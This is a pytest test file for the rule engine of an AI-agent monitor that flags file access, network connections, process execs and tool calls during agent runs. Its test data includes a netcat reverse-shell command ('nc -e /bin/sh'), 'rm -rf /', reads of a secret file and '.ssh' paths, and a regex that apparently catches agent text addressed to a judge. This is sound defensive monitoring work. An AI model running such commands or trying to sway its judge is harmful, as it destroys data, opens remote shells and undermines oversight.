import asyncio
import glob
import json
import random
import re
import time
from collections.abc import AsyncIterator, Callable
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any, cast

import pytest
from test_signals import AGENT, Bench, bench, change, scenario

from aims.events import (
    BlobRef,
    ChannelInfo,
    FileAccess,
    LocalEventStore,
    MonitorDegraded,
    NetConnect,
    ProcSignal,
    TaskScored,
    ToolCall,
)
from aims.events.schema import format_ts
from aims.monitor.config import MonitorConfig, Rule
from aims.monitor.signals import scan
from aims.monitor.signals.base import SignalError, SignalSetup, registry
from aims.monitor.signals.engine import EVIDENCE, SignalEngine
from aims.monitor.signals.rules import (
    RuleSignal,
    _hashable,
    _spreads_lists,
    compile_glob,
    compile_rule,
    rule_signal,
    rules_digest,
    validate_rules,
)

pytestmark = pytest.mark.anyio


@pytest.fixture
async def store(tmp_path: Path) -> AsyncIterator[LocalEventStore]:
    async with await LocalEventStore.open(tmp_path / "runs") as store:
        yield store


def rule(**f: Any) -> Rule:
    base: dict[str, Any] = {
        "id": "r",
        "title": "rule",
        "event": ["file.access"],
        "category": "constraint_violation",
        "importance": 3,
    }
    return Rule.model_validate({**base, **f})


def problems(**f: Any) -> list[str]:
    return validate_rules([rule(**f)])


def test_a_sound_rule_validates() -> None:
    assert (
        problems(
            match={"op": ["write", "rename"], "path|glob": "/work/**", "agent_written": False},
            filter=[{"phase": "setup"}, {"path|endswith|any": [".pyc", ".tmp"]}],
            key="{path} {agent}",
        )
        == []
    )
    assert problems(event=["fs.change"], match={"timestomp": True}) == []
    assert problems(filter=[]) == []
    assert problems(event=["proc.exec"], match={"fds.1.kind": "pipe", "argv.0|re": "^py"}) == []
    assert problems(event=["fs.snapshot"], match={"changes.path|startswith": "/work"}) == []
    assert problems(event=["run.started"], match={"config.anything.below": 1}) == []


@pytest.mark.parametrize(
    ("fields", "message"),
    [
        ({"event": ["file.nothing"]}, "unknown event type file.nothing"),
        ({"event": ["monitor.flag"]}, "unknown event type monitor.flag"),
        ({"match": {"nope": 1}}, "has no field 'nope'"),
        ({"event": ["proc.exec"], "match": {"fds.3.ino": 1}}, "has no field 'fds.3.ino'"),
        ({"event": ["proc.exec"], "match": {"path.deeper": "x"}}, "has no field 'path.deeper'"),
        ({"event": ["file.access", "net.connect"], "match": {"op": "read"}}, "net.connect has no"),
        ({"match": {"target_in_tree": True}}, "does not apply to file.access"),
        ({"match": {"phase.x": 1}}, "has no parts"),
        ({"match": {"path|regex": "x"}}, "unknown modifier regex"),
        ({"match": {"path|glob|re": "x"}}, "at most one comparison"),
        ({"match": {"path|any|all": "x"}}, "at most one comparison"),
        ({"match": {"path|re": "("}}, "bad regex"),
        ({"match": {"path|cidr": "10.0.0.0/33"}}, "is not a network"),
        ({"match": {"errno|gt": "1"}}, "gt takes a number"),
        ({"match": {"path|contains": 1}}, "contains takes text"),
        ({"match": {"path|exists": "yes"}}, "exists takes true or false"),
        ({"match": {"path": []}}, "an empty list matches nothing"),
        ({"match": {"path": {"a": 1}}}, "is not a scalar"),
        ({"filter": [{"nope|contains": "x"}]}, "filter 1: file.access has no field"),
        ({"filter": {}}, "filter 1: an empty filter excludes every event"),
        ({"filter": [{"phase": "setup"}, {}]}, "filter 2: an empty filter excludes every event"),
        ({"key": "{nope}"}, "key: file.access has no field 'nope'"),
        ({"key": "{path"}, "unbalanced braces"),
    ],
)
def test_validation_errors(fields: dict[str, Any], message: str) -> None:
    found = problems(**fields)
    assert found, fields
    assert any(message in p for p in found), found
    assert all(p.startswith("rule r:") for p in found)
    with pytest.raises(SignalError):
        compile_rule(rule(**fields))


def test_globs() -> None:
    assert compile_glob("*.pth")("/usr/lib/site-packages/x.pth")
    assert not compile_glob("/work/*.py")("/work/a/b.py")
    assert compile_glob("/work/**")("/work/a/b.py")
    assert compile_glob("**/.ssh/**")("/home/agent/.ssh/id")
    assert not compile_glob("/work/test_*.py")("/work/__pycache__/test_a.cpython-313.pyc")


def _one_regex(pattern: str) -> Callable[[str], bool]:
    """The glob matcher of before: one regex over the whole path."""
    full = re.compile(glob.translate(pattern, recursive=True, include_hidden=True, seps="/"))
    if "/" in pattern:
        return lambda s: full.match(s) is not None
    return lambda s: full.match(s) is not None or full.match(s.rsplit("/", 1)[-1]) is not None


def test_a_glob_matches_what_one_regex_over_the_path_matched() -> None:
    rng = random.Random(454)
    names = ["a", "b", "*", "**", "?", "a*", "*a", "*a*b", "a?", "", "***", "[ab]", "ab"]
    names += ["*.py", "a*b*a", "\n", "**a", "a**"]
    parts = ["a", "b", "", "ab", "aa", "ba", "a.py", "aab", "bab", "\n", "abba", "."]
    for _ in range(20_000):
        pattern = "/".join(rng.choice(names) for _ in range(rng.randint(1, 6)))
        path = "/".join(rng.choice(parts) for _ in range(rng.randint(1, 7)))
        assert compile_glob(pattern)(path) == _one_regex(pattern)(path), (pattern, path)


@pytest.mark.parametrize(
    ("pattern", "path", "matches"),
    [
        ("**/a", "/a", False),
        ("**/a", "x/a", True),
        ("**/a", "//a", True),
        ("**/a", "a", True),
        ("/work/**", "/work", False),
        ("/work/**", "/work/", True),
        ("**", "", True),
        ("*", "", False),
        ("/work/**/**/a", "/work/a", True),
        ("**/a/**/b/**/c", "x/a/b/y/z/c", True),
        ("**/a/**/b/**/c", "x/a/b/y/z/c/d", False),
        ("**/a/**/b/**", "a/b", False),
        ("**/a/**/b/**", "a/b/", True),
        ("**/a/**/b", "a//b", False),
        ("**/a/**/b", "a///b", True),
        ("*a*a*b", "xaxab", True),
        ("*a*a*b", "xab", False),
        ("x/*a*a*b/y", "x/aab/y", True),
    ],
)
def test_a_glob_reads_parts_as_before(pattern: str, path: str, matches: bool) -> None:
    assert compile_glob(pattern)(path) is matches
    assert _one_regex(pattern)(path) is matches


def test_a_class_in_a_glob_matches_no_slash() -> None:
    assert compile_glob("/work/a[!b]c")("/work/axc")
    assert not compile_glob("/work/a[!b]c")("/work/a/c")
    assert _one_regex("/work/a[!b]c")("/work/a/c")
    assert not compile_glob("/work/[+-0]x")("/work//x")
    assert compile_glob("*.py[co]")("/work/__pycache__/a.pyc")


@pytest.mark.parametrize(
    ("pattern", "path"),
    [
        ("*a*a*a*a*a*b", "a" * 4095),
        ("/work/*a*a*a*a*b/x", "/work/" + "a" * 4000 + "/y"),
        ("**/a/**/a/**/a/**/a/**/b", "a/" * 2047 + "c"),
        ("**/*a*a/**/*a*a/**/b", "aa/" * 1365),
        ("*[a]*[a]*[a]*[a]*b", "a" * 4095),
        ("**/a/**", "/" * 4095),
    ],
)
def test_a_glob_reads_a_shaped_path_in_linear_time(pattern: str, path: str) -> None:
    # One regex over the path took 0.5 s for `*a*a*a*b` on 256 characters, and about 16 times
    # that for each doubling.
    test = compile_glob(pattern)
    start = time.process_time()
    assert not test(path)
    assert time.process_time() - start < 0.5


async def run_rule(
    store: LocalEventStore, r: Rule, *, config: dict[str, Any] | None = None
) -> Bench:
    return await bench(store, config=MonitorConfig(preset="signals", rules=[r], **(config or {})))


async def test_match_lists_or_all_and_filters(store: LocalEventStore) -> None:
    r = rule(
        match={"op": ["write", "delete"], "path|startswith|all": ["/work/", "/work/src"]},
        filter=[{"path|endswith": ".pyc"}],
        key="{op} {path}",
    )
    b = await run_rule(store, r)
    await b.bash(
        "x",
        lambda ex: b.k(FileAccess, ex, op="write", path="/work/src/a.py"),
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/src/b.py"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/c.py"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/src/c.pyc"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/src/d.py"),
    )
    flags = b.of("r")
    assert [f.key for f in flags] == ["write /work/src/a.py", "delete /work/src/d.py"]
    assert all(f.justification.startswith("rule: ") for f in flags)
    assert all(
        (f.category, f.importance, f.layer) == ("constraint_violation", 3, "signal") for f in flags
    )


async def test_modifiers_on_numbers_networks_and_lists(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="net",
            event=["net.connect"],
            match={"address|cidr": ["10.0.0.0/8", "fd00::/8"], "port|gte": 1000, "port|lt": 2000},
            key="{address}",
        ),
        rule(
            id="args",
            event=["proc.exec"],
            match={"argv|contains": "secret", "argv.0": "cat"},
            key="{argv}",
        ),
        rule(id="none", event=["proc.exec"], match={"argv.1|exists": False}, key="{program}"),
        rule(id="re", event=["tool.call"], match={"arguments|re": r"\brm\s+-rf\b"}, key="{name}"),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    await b.bash(
        "x",
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="10.1.2.3", port=1500
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="10.1.2.4", port=2000
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet6", address="::ffff:10.0.0.1", port=1000
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="11.0.0.1", port=1500
        ),
        lambda ex: b.proc(ex, ["cat", "/work/secret.txt"]),
        lambda ex: b.proc(ex, ["head", "secret"]),
        lambda ex: b.proc(ex, ["ls"]),
    )
    await b.call("bash", {"command": "rm -rf /"})
    assert [f.key for f in b.of("net")] == ["10.1.2.3", "::ffff:10.0.0.1"]
    assert [f.key for f in b.of("args")] == ["cat /work/secret.txt"]
    assert [f.key for f in b.of("none")] == ["ls"]
    assert [f.key for f in b.of("re")] == ["bash"]


async def test_scope_and_derived_fields(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="mine",
            event=["file.access"],
            scope={"phase": ["agent"], "agent": [AGENT]},
            match={"agent_written": True, "op": "read"},
            key="{path} {tool} {step}",
        ),
        rule(
            id="sig", event=["proc.signal"], match={"target_in_tree": False}, key="{target_agent}"
        ),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a.py"))
    await b.bash(
        "y",
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/a.py"),
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/b.py"),
        lambda ex: b.k(ProcSignal, ex, target=ex.root, signal=15),
        lambda ex: b.k(ProcSignal, ex, target=99999, signal=15),
    )
    v = await b.exec("score", phase="verifier")
    await b.emit(b.k(FileAccess, v, op="read", path="/work/a.py"))
    assert [f.key for f in b.of("mine")] == ["/work/a.py bash 2"]
    assert [f.key for f in b.of("sig")] == [None]


async def test_rules_see_snapshot_changes_and_blob_content(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="snap",
            event=["fs.change"],
            match={"path|glob": "*.sh", "change": "added"},
            filter=[{"phase": ["setup", "verifier"]}],
            key="{path}",
        ),
        rule(id="long", event=["tool.call"], match={"arguments|contains": "NEEDLE"}, key="{name}"),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    ex = await b.bash("x")
    await b.snapshot(ex, change("/work/run.sh"), change("/work/a.py"))
    setup = await b.exec("seed", phase="setup")
    await b.snapshot(setup, change("/work/seed.sh"))
    big = json.dumps({"command": "x" * 20_000 + "NEEDLE"})
    blob = await b.store.content(b.run_id, big)
    assert not isinstance(blob, str)
    await b.emit(ToolCall(call_id="big", name="bash", arguments=blob))
    assert [f.key for f in b.of("snap")] == ["/work/run.sh"]
    assert [f.key for f in b.of("long")] == ["bash"]


async def test_scenario_rules_obey_signal_options(store: LocalEventStore) -> None:
    r = rule(match={"op": "write"})
    off = MonitorConfig(preset="signals", rules=[r.model_copy(update={"enabled": False})])
    b = await bench(store, config=off)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert b.of("r") == []
    louder = MonitorConfig(preset="signals", rules=[r], signals={"r": {"importance": 5}})
    b = await bench(store, config=louder)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert [f.importance for f in b.of("r")] == [5]
    with pytest.raises(SignalError, match=r"signal r"):
        SignalEngine(
            MonitorConfig(preset="signals", rules=[r], signals={"r": {"options": {"x": 1}}}),
            b.scenario,
            run_id=b.run_id,
            store=store,
        )
    with pytest.raises(SignalError, match="bad regex"):
        SignalEngine(
            MonitorConfig(preset="signals", rules=[rule(match={"path|re": "["})]),
            b.scenario,
            run_id=b.run_id,
            store=store,
        )


async def test_the_most_important_matching_rule_of_a_signal_wins(store: LocalEventStore) -> None:
    b = await bench(store)
    await b.bash(
        "nc",
        lambda ex: b.proc(ex, ["nc", "-e", "/bin/sh", "host", "1"]),
    )
    (flag,) = b.of("net_tool_exec")
    assert (flag.importance, flag.justification) == (3, "netcat with a command to run: nc")


async def test_a_rule_counts_matches_per_agent_and_window(
    store: LocalEventStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    r = rule(
        match={"op": "write"},
        count=3,
        window_s=10,
        key="{path}",
    )
    b = await run_rule(store, r)
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
    )
    assert b.of("r") == []
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(3)],
    )
    (flag,) = b.of("r")
    assert len(flag.evidence) == 3

    clock = datetime(2026, 1, 1, tzinfo=UTC)
    monkeypatch.setattr("aims.events.store.now", lambda: format_ts(clock))
    r = rule(match={"op": "write"}, count=3, window_s=0.5, key="{path}")
    b = await run_rule(store, r)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    clock += timedelta(seconds=1)
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
    )
    assert b.of("r") == []
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert len(b.of("r")) == 1


async def test_a_rule_counts_a_field_distinctly(store: LocalEventStore) -> None:
    r = rule(
        match={"op": "write"},
        count=2,
        window_s=10,
        distinct="path",
        key="{path}",
    )
    b = await run_rule(store, r)
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
    )
    assert b.of("r") == []
    await b.bash(
        "x",
        lambda ex: [
            b.k(FileAccess, ex, op="write", path="/work/a"),
            b.k(FileAccess, ex, op="write", path="/work/b"),
        ],
    )
    assert len(b.of("r")) == 1


async def test_a_windowed_distinct_rule_forgets_a_value_once_its_last_match_expires(
    store: LocalEventStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    clock = datetime(2026, 1, 1, tzinfo=UTC)
    monkeypatch.setattr("aims.events.store.now", lambda: format_ts(clock))
    r = rule(event=["tool.call"], count=2, window_s=10, distinct="name", key="{name}")
    b = await run_rule(store, r)
    flags: list[int] = []
    for after, name in [(0, "a"), (5, "a"), (7, "b"), (20, "a"), (11, "b"), (1, "a")]:
        clock += timedelta(seconds=after)
        await b.call(name, {"x": 1})
        flags.append(len(b.of("r")))
    assert flags == [0, 0, 1, 1, 1, 2]
    calls = [e.seq for e in b.events if e.type == "tool.call"]
    assert [f.evidence for f in b.of("r")] == [calls[1:3], calls[4:6]]


async def test_a_windowed_distinct_rule_keeps_one_match_per_value(store: LocalEventStore) -> None:
    r = rule(event=["tool.call"], count=2, window_s=3600, distinct="name", key="{name}")
    b = await run_rule(store, r)
    for _ in range(EVIDENCE + 10):
        await b.call("a", {"x": 1})
    signal = next(a.signal for a in cast(Any, b.engine).signals if a.signal.name == "r")
    assert [len(values) for values in signal.latest.values()] == [1]
    await b.call("b", {"x": 1})
    calls = [e.seq for e in b.events if e.type == "tool.call"]
    (flag,) = b.of("r")
    # The burst of one value leaves only its latest match, so the evidence holds both values.
    assert flag.evidence == [calls[-2], calls[-1]]


@dataclass(frozen=True)
class Fed:
    """The parts of an event a rule signal reads."""

    seq: int
    agent_id: str | None
    ts: datetime
    type: str


class Hashed:
    """A value that counts how often it is hashed."""

    def __init__(self) -> None:
        self.calls = 0

    def __hash__(self) -> int:
        self.calls += 1
        return 0


class Holds:
    """A state that gives every event the same payload."""

    def __init__(self, payload: Any) -> None:
        self.held = payload

    def payload(self, event: Any) -> Any:
        return self.held


async def test_a_windowed_distinct_rule_does_not_scan_its_window_on_each_match() -> None:
    r = rule(event=["tool.call"], count=2, window_s=3600, distinct="name")
    signal = rule_signal(r)(SignalSetup(MonitorConfig(preset="signals"), scenario(), {}))
    value = Hashed()
    # Built without checks, the payload can hold a value that counts its hashes.
    state = cast(Any, Holds(ToolCall.model_construct(call_id="c", name=value, arguments="{}")))
    start = datetime(2026, 1, 1, tzinfo=UTC)
    matches = 2_000
    for i in range(matches):
        event = Fed(i, AGENT, start + timedelta(milliseconds=i), "tool.call")
        assert await signal.feed(cast(Any, event), state) == []
    assert value.calls < 10 * matches


@pytest.mark.parametrize(
    ("names", "flagged"),
    [
        ("a b c", True),
        ("a b a a c", True),
        ("a a a b b b c", True),
        ("a a b b a b", False),
    ],
)
async def test_a_distinct_rule_without_a_window_keeps_every_value(
    store: LocalEventStore, names: str, flagged: bool
) -> None:
    r = rule(event=["tool.call"], count=3, distinct="name", key="{name}")
    b = await run_rule(store, r)
    for name in names.split():
        await b.call(name, {"x": 1})
    calls = [e for e in b.events if e.type == "tool.call"]
    if not flagged:
        assert b.of("r") == []
        return
    (flag,) = b.of("r")
    firsts: dict[str, int] = {}
    for e in calls:
        firsts.setdefault(str(e.data["name"]), e.seq)
    assert flag.evidence == list(firsts.values())


def test_a_distinct_rule_has_a_new_version() -> None:
    whole = rule(event=["tool.call"], count=3, distinct="name")
    assert rule_signal(whole).version == f"{rules_digest([whole])[:12]}.2"
    windowed = rule(event=["tool.call"], count=3, distinct="name", window_s=10)
    assert rule_signal(windowed).version == f"{rules_digest([windowed])[:12]}.4"
    counted = rule(event=["tool.call"], count=3, window_s=10)
    assert rule_signal(counted).version == rules_digest([counted])[:12]


async def test_a_rule_rate_without_a_window_starts_over_once_it_flags(
    store: LocalEventStore,
) -> None:
    r = rule(event=["tool.call"], count=2, distinct="name")
    b = await run_rule(store, r)
    for name in ["a", "b", "a", "a", "c", "c", "b"]:
        await b.call(name, {"x": 1})
    await b.close()
    assert b.of("r")[-1].count == 3


@pytest.mark.parametrize("window_s", [None, 10])
async def test_a_rule_counts_distinct_lists(store: LocalEventStore, window_s: float | None) -> None:
    r = rule(
        event=["proc.exec"],
        match={"path|startswith": "/usr/bin/"},
        count=2,
        window_s=window_s,
        distinct="argv",
        key="{program}",
    )
    b = await run_rule(store, r)
    ex = await b.exec("x")
    same = await b.emit(b.proc(ex, ["ls", "-l"]), b.proc(ex, ["ls", "-l"]))
    assert b.of("r") == []
    (other,) = await b.emit(b.proc(ex, ["ls", "-la"]))
    (flag,) = b.of("r")
    assert b.others == []
    seqs = [e.seq for e in [*same, other]]
    # Over the whole run a value keeps its first match; in a window, its latest.
    assert flag.evidence == ([seqs[1], seqs[2]] if window_s else [seqs[0], seqs[2]])


async def test_a_rule_counts_distinct_maps_whatever_their_order(store: LocalEventStore) -> None:
    r = rule(event=["exec.started"], count=2, distinct="env", key="{command}")
    b = await run_rule(store, r)
    await b.exec("a", env={"A": "1", "B": "2"})
    await b.exec("b", env={"B": "2", "A": "1"})
    assert b.of("r") == []
    await b.exec("c", env={"A": "1"})
    assert [f.key for f in b.of("r")] == ["c"]
    assert b.others == []


def test_distinct_values_of_every_shape_compare_by_content() -> None:
    blob = BlobRef(sha256="0" * 64, size=1)
    folder = {"name": "n", "kind": "folder", "members": ["a", "b"]}
    same = [
        (["ls", "-l"], ["ls", "-l"]),
        ({"a": [1, {"b": None}], "c": 2.5}, {"c": 2.5, "a": [1, {"b": None}]}),
        (ChannelInfo.model_validate(folder), ChannelInfo.model_validate(folder)),
        ([change("/work/a")], [change("/work/a")]),
        (blob, BlobRef(sha256="0" * 64, size=1)),
        ("x", "x"),
        (3, 3),
        (1, 1.0),
        (True, True),
        (None, None),
    ]
    for x, y in same:
        assert _hashable(x) == _hashable(y)
        assert hash(_hashable(x)) == hash(_hashable(y))
    differ = [
        (["ls", "-l"], ["-l", "ls"]),
        ({"a": [1]}, {"a": [2]}),
        ({"a": 1}, [["a", 1]]),
        (ChannelInfo.model_validate(folder), {**folder, "path": None, "read_only": []}),
        (ChannelInfo.model_validate(folder), ChannelInfo.model_validate(folder | {"members": []})),
        ([change("/work/a")], [change("/work/b")]),
        ([], None),
        (True, 1),
        (False, 0),
        ([True], [1]),
        ({"a": False}, {"a": 0.0}),
    ]
    for x, y in differ:
        assert _hashable(x) != _hashable(y)


async def test_a_distinct_rule_keeps_true_apart_from_1(store: LocalEventStore) -> None:
    r = rule(event=["task.scored"], count=2, distinct="metrics.passed")
    b = await run_rule(store, r)
    await b.emit(TaskScored(reward=1.0, metrics={"passed": True}))
    await b.emit(TaskScored(reward=1.0, metrics={"passed": True}))
    assert b.of("r") == []
    await b.emit(TaskScored(reward=1.0, metrics={"passed": 1}))
    assert len(b.of("r")) == 1


@pytest.mark.parametrize(
    ("fields", "suffix"),
    [
        ({"event": ["proc.exec"], "distinct": "argv"}, ".3"),
        ({"event": ["exec.started"], "distinct": "env"}, ".3"),
        ({"event": ["run.started"], "distinct": "channels.0"}, ".3"),
        ({"event": ["run.started"], "distinct": "config.x"}, ".5"),
        ({"event": ["fs.snapshot"], "distinct": "changes"}, ".5"),
        ({"event": ["task.scored"], "distinct": "metrics.passed"}, ".5"),
        ({"event": ["task.scored"], "distinct": "metrics", "window_s": 10}, ".5"),
        ({"event": ["proc.exec"], "distinct": "argv.0"}, ".2"),
        ({"event": ["proc.exec"], "distinct": "fds"}, ".2"),
        ({"event": ["proc.exec"], "distinct": "program"}, ".2"),
        ({"event": ["tool.call"], "distinct": "arguments"}, ".2"),
        ({"event": ["tool.call"], "distinct": True}, ".2"),
        ({"event": ["proc.exec"], "distinct": "argv", "window_s": 10}, ".4"),
        ({"event": ["proc.exec"], "distinct": "argv.0", "window_s": 10}, ".4"),
        ({"event": ["tool.call"], "distinct": True, "window_s": 10}, ".4"),
        ({"event": ["proc.exec"], "window_s": 10}, ""),
        ({"event": ["proc.exec"]}, ""),
        ({"event": ["fs.snapshot"], "distinct": "changes.path"}, ".6"),
        ({"event": ["fs.snapshot"], "distinct": "changes.path", "window_s": 10}, ".6"),
        ({"event": ["proc.exec"], "distinct": "fds.ino"}, ".6"),
        ({"event": ["fs.snapshot"], "key": "{changes.path}"}, ".6"),
        ({"event": ["fs.snapshot"], "key": "{changes.0.path}"}, ""),
        ({"event": ["run.started"], "key": "{config.x.y}"}, ".6"),
        ({"event": ["run.started"], "key": "{config.x}"}, ""),
        ({"event": ["proc.exec"], "key": "{argv} {fds.1.ino}"}, ""),
        ({"event": ["file.access"], "match": {"path|glob": "/work/[!.]*"}}, ".7"),
        ({"event": ["file.access"], "match": {"path|glob|all": ["/a", "/b[0-9]"]}}, ".7"),
        ({"event": ["file.access"], "filter": [{"path|glob": "*.py[co]"}]}, ".7"),
        ({"event": ["proc.exec"], "distinct": "fds.ino", "match": {"path|glob": "[a]"}}, ".7"),
        ({"event": ["file.access"], "match": {"path|glob": "/work/*", "path|re": "[a]"}}, ""),
        ({"event": ["file.access"], "match": {"path|contains": "[a]"}}, ""),
    ],
)
def test_a_rule_that_counts_lists_or_maps_has_a_new_version(
    fields: dict[str, Any], suffix: str
) -> None:
    r = rule(count=2, **fields)
    assert rule_signal(r).version == f"{rules_digest([r])[:12]}{suffix}"


async def test_rule_rate_counts_do_not_mix_agents(store: LocalEventStore) -> None:
    from aims.scenario import Scenario

    sc = Scenario.model_validate(
        {
            "version": 1,
            "name": "two",
            "oversight": "observe",
            "task": {"instruction": "x", "environment": {"image": "python:3.13"}},
            "agents": [{"id": "a"}, {"id": "b"}],
        }
    )
    r = rule(match={"op": "write"}, count=3, window_s=10, key="{path}")
    b = await bench(store, config=MonitorConfig(preset="signals", rules=[r]), scenario=sc)
    for agent in ("a", "b"):
        await b.bash(
            "x",
            lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
            agent=agent,
        )
    assert b.of("r") == []
    await b.bash(
        "x",
        lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"),
        agent="a",
    )
    assert len(b.of("r")) == 1


async def test_a_key_or_distinct_path_through_a_list_reads_every_item(
    store: LocalEventStore,
) -> None:
    keyed = rule(id="keyed", event=["fs.snapshot"], key="{changes.path} {changes.sha256}")
    counted = rule(id="counted", event=["fs.snapshot"], count=2, distinct="changes.path")
    b = await bench(store, config=MonitorConfig(preset="signals", rules=[keyed, counted]))
    ex = await b.bash("x")
    await b.snapshot(ex, change("/work/a"), change("/work/b", sha256="0" * 64))
    assert [f.key for f in b.of("keyed")] == [f"/work/a /work/b {'0' * 64}"]
    assert b.of("counted") == []
    # The same first item: only the later ones tell the two snapshots apart.
    await b.snapshot(ex, change("/work/a"), change("/work/c"))
    assert len(b.of("counted")) == 1


def test_no_catalogue_rule_keys_on_a_list_without_an_index() -> None:
    setup = SignalSetup(MonitorConfig(preset="signals"), scenario(), {})
    for name, cls in registry().items():
        if isinstance(cls, type) and issubclass(cls, RuleSignal):
            assert not any(_spreads_lists(r) for r in cls.build(setup)), name


def test_a_distinct_field_must_exist() -> None:
    assert any("distinct" in p for p in problems(distinct="nope"))


async def test_a_slow_rule_regex_degrades_the_rule_at_its_budget(
    store: LocalEventStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(scan, "INLINE_S", 0.02)
    monkeypatch.setattr(scan, "THREAD_S", 0.05)
    slow = rule(id="slow", event=["tool.call"], match={"arguments|re": r"hi\s*,?\s+judge"})
    b = await bench(store, config=MonitorConfig(preset="signals", rules=[slow]))
    start = time.perf_counter()
    for _ in range(scan.STRIKES + 3):
        await b.call("bash", {"command": "hi" + " " * 100_000})
    # Three scans run to the budget, then the pattern rests.
    assert time.perf_counter() - start < 2
    await b.call("bash", {"command": "echo ok"})
    assert b.of("slow") == []
    degraded = [p for p in (e.payload() for e in b.others) if isinstance(p, MonitorDegraded)]
    assert [d.reason.partition(" at ")[0] for d in degraded] == ["signal slow failed"]
    assert "SlowScan" in (degraded[0].detail or "")


@pytest.mark.parametrize("size", [30_000, 100_000], ids=["short", "long"])
async def test_a_slow_rule_regex_leaves_the_loop_free(
    store: LocalEventStore, monkeypatch: pytest.MonkeyPatch, size: int
) -> None:
    monkeypatch.setattr(scan, "SYNC_S", 0.3)
    monkeypatch.setattr(scan, "INLINE_S", 0.02)
    monkeypatch.setattr(scan, "THREAD_S", 0.3)
    slow = rule(id="slow", event=["tool.call"], match={"arguments|re": r"hi\s*,?\s+judge"})
    b = await bench(store, config=MonitorConfig(preset="signals", rules=[slow]))
    worst = 0.0
    done = False

    async def tick() -> None:
        nonlocal worst
        while not done:
            start = time.perf_counter()
            await asyncio.sleep(0.01)
            worst = max(worst, time.perf_counter() - start)

    ticker = asyncio.create_task(tick())
    await asyncio.sleep(0.03)
    start = time.perf_counter()
    await b.call("bash", {"command": "hi" + " " * size})
    took = time.perf_counter() - start
    done = True
    await ticker
    degraded = [p for p in (e.payload() for e in b.others) if isinstance(p, MonitorDegraded)]
    assert "ran past 0.3 s" in (degraded[0].detail or "")
    # A short text has its first try on the loop, at INLINE_S.
    assert worst < 0.15, f"the loop stalled {worst:.3f} s in a {took:.3f} s scan"
